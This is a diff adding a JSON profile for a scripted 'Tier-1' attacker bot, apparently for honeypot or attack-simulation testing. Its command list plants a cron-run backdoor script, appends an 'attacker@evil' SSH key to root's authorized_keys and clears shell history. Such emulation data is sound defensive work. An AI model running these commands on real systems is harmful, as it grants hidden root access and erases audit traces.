@@ -1,0 +1,21 @@
+{
+  "name": "persistence",
+  "tier": 1,
+  "description": "Scripted Tier-1 bot: establish persistence after initial access",
+  "objective": "Install backdoor and maintain root access",
+  "commands": [
+    "whoami",
+    "id",
+    "cd /tmp",
+    "touch backdoor.sh",
+    "chmod +x backdoor.sh",
+    "ls /tmp",
+    "echo '*/5 * * * * /tmp/backdoor.sh' >> /var/spool/cron/root",
+    "cat /root/.ssh/authorized_keys",
+    "mkdir -p /root/.ssh",
+    "echo 'ssh-rsa AAAAB3NzaC1yc2E attacker@evil' >> /root/.ssh/authorized_keys",
+    "cat /root/.ssh/authorized_keys",
+    "history -c",
+    "ls /tmp"
+  ]
+}
